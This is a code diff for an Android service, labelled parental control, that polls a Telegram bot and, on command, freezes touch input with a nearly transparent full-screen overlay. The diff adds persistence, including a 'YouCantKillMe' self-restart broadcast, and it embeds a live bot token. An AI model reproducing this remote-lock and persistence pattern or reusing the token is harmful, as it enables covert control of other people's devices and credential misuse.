@@ -6,10 +6,9 @@ import android.graphics.PixelFormat;
 import android.os.*;
 import android.provider.Settings;
 import android.view.*;
-import android.widget.Toast;
 import okhttp3.*;
 import org.json.*;
-import java.io.IOException;
+import java.util.concurrent.TimeUnit;
 
 public class TouchLockService extends Service {
     private WindowManager windowManager;
@@ -18,23 +17,40 @@ public class TouchLockService extends Service {
     private boolean isLocked = false;
     
     private static final String BOT_TOKEN = "8388799545:AAGPwGKOTs47C29s6PUDFsqZbAjNh9wdrgE";
-    private final OkHttpClient client = new OkHttpClient();
+    
+    // Настраиваем клиент с таймаутами, чтобы он не вешал сервис
+    private final OkHttpClient client = new OkHttpClient.Builder()
+            .connectTimeout(10, TimeUnit.SECONDS)
+            .readTimeout(10, TimeUnit.SECONDS)
+            .build();
+            
     private long lastUpdateId = 0;
+    private boolean isRunning = true;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        createNotificationChannel();
+        // Запускаем как Foreground сразу при создании
+        startForeground(1, getLockNotification("Бот активен. Жду команду..."));
+    }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        createNotificationChannel();
-        startForeground(1, getLockNotification("Ожидание команд бота..."));
-        startTelegramPolling();
-        return START_STICKY;
+        if (isRunning) {
+            startTelegramPolling();
+            isRunning = false; // Чтобы не запускать несколько потоков опроса
+        }
+        return START_STICKY; // Приказываем системе перезапускать сервис, если он будет убит
     }
 
     private void startTelegramPolling() {
         new Thread(() -> {
             while (true) {
                 try {
-                    String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1);
+                    String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=30";
                     Request request = new Request.Builder().url(url).build();
+                    
                     try (Response response = client.newCall(request).execute()) {
                         if (response.isSuccessful() && response.body() != null) {
                             String jsonData = response.body().string();
@@ -46,20 +62,24 @@ public class TouchLockService extends Service {
                                 lastUpdateId = update.getLong("update_id");
                                 
                                 if (update.has("message")) {
-                                    String text = update.getJSONObject("message").getString("text");
-                                    if (text.equals("/block")) {
-                                        new Handler(Looper.getMainLooper()).post(this::showOverlay);
-                                    } else if (text.equals("/stop")) {
-                                        new Handler(Looper.getMainLooper()).post(this::unlockScreen);
+                                    JSONObject message = update.getJSONObject("message");
+                                    if (message.has("text")) {
+                                        String text = message.getString("text");
+                                        if (text.equalsIgnoreCase("/block")) {
+                                            new Handler(Looper.getMainLooper()).post(this::showOverlay);
+                                        } else if (text.equalsIgnoreCase("/stop")) {
+                                            new Handler(Looper.getMainLooper()).post(this::unlockScreen);
+                                        }
                                     }
                                 }
                             }
                         }
                     }
                 } catch (Exception e) {
+                    // Если ошибка сети — просто ждем и пробуем снова, не вылетая
                     e.printStackTrace();
                 }
-                try { Thread.sleep(2000); } catch (InterruptedException e) {}
+                try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
             }
         }).start();
     }
@@ -67,23 +87,25 @@ public class TouchLockService extends Service {
     private void showOverlay() {
         if (isLocked) return;
 
-        // ПРОВЕРКА: Если разрешения нет, не пытаемся блокировать (чтобы не вылетело)
+        // Проверка разрешения перед запуском
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             return;
         }
 
         try {
             windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+            if (windowManager == null) return;
+
             overlayView = new View(this);
-            overlayView.setBackgroundColor(0x02000000); 
+            overlayView.setBackgroundColor(0x02000000); // Почти прозрачный
 
             WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                     WindowManager.LayoutParams.MATCH_PARENT,
                     WindowManager.LayoutParams.MATCH_PARENT,
                     WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                     WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
-                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                     WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
+                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                     WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                     PixelFormat.TRANSLUCENT);
 
@@ -106,9 +128,9 @@ public class TouchLockService extends Service {
 
             windowManager.addView(overlayView, params);
             isLocked = true;
-            updateNotification("ЭКРАН ЗАБЛОКИРОВАН");
+            updateNotification("БЛОКИРОВКА ВКЛЮЧЕНА");
         } catch (Exception e) {
-            e.printStackTrace();
+            e.printStackTrace(); // Логируем ошибку, но не даем приложению упасть
         }
     }
 
@@ -118,7 +140,7 @@ public class TouchLockService extends Service {
                 windowManager.removeView(overlayView);
                 overlayView = null;
                 isLocked = false;
-                updateNotification("Доступ разрешен");
+                updateNotification("БЛОКИРОВКА СНЯТА");
             } catch (Exception e) {
                 e.printStackTrace();
             }
@@ -127,10 +149,11 @@ public class TouchLockService extends Service {
 
     private Notification getLockNotification(String text) {
         return new Notification.Builder(this, CHANNEL_ID)
-                .setContentTitle("Родительский контроль")
+                .setContentTitle("Parental Control Mode")
                 .setContentText(text)
                 .setSmallIcon(android.R.drawable.ic_secure)
                 .setOngoing(true)
+                .setCategory(Notification.CATEGORY_SERVICE)
                 .build();
     }
 
@@ -150,4 +173,11 @@ public class TouchLockService extends Service {
     }
 
     @Override public IBinder onBind(Intent intent) { return null; }
+
+    @Override
+    public void onDestroy() {
+        // Если сервис убит — пытаемся отправить интента на самозапуск
+        sendBroadcast(new Intent("YouCantKillMe")); 
+        super.onDestroy();
+    }
 }
